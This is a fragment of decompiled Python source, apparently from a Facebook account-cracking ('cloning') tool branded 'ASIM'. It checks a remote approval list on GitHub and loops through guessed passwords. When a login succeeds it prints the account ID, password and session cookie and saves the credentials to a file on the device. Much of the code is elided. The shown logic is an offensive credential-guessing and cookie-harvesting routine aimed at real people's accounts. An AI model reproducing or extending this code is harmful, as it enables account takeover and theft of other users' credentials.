...
# Time Succes decompile : 2022-12-07 06:42:16.590939
...
def uaku():
    try:
        ...
        a=requests.get('https://raw.githubusercontent.com/SHAHZADA-AHMED-ASIM/BD-RANDOM-CLONE/main/Approved.txt').text
        ff=open('show.txt','w')
...
psb('\x1b[1;31mBANGLADESH ASIM CLONING START PLEASE WAIT ..........')
time.sleep(3)
...
def main():
    ...
    print(f"║══[{H}[{M}Y{H}] \033[1;92mFOLLOWING ME ON YOUTUBE {RED} ")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio ASIM_OK.mp3")
                print('    \033[1;92m[ASIM-OK] '+uid+' | '+ps+'\033[0;97m')
                print(f'    {B}[NUMBER📳] {K}'+uid+'  ')
                print(f'    {B}[COOKI💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/ASIM-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mASIM","\x1b[1;92mASIM","\x1b[1;93mASIM","\x1b[1;94mASIM","\x1b[1;95mASIM","\x1b[1;96mASIM","\x1b[1;97mASIM","\x1b[1;91mASIM","\x1b[1;92mASIM","\x1b[1;93mASIM","\x1b[1;94mASIM","\x1b[1;95mASIM","\x1b[1;96mASIM"])
